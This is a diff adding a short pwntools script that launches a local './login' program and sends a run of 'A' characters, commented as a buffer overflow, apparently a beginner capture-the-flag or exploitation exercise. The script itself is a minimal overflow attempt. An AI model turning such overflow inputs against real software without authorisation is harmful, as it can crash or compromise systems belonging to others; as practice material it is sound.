@@ -1,0 +1,10 @@
+from pwn import *
+
+# Start program
+io = process('./login')
+
+# Send string to overflow buffer
+io.sendlineafter(b':', b'AAAAAAA')
+
+# Receive output
+print(io.recvall().decode())
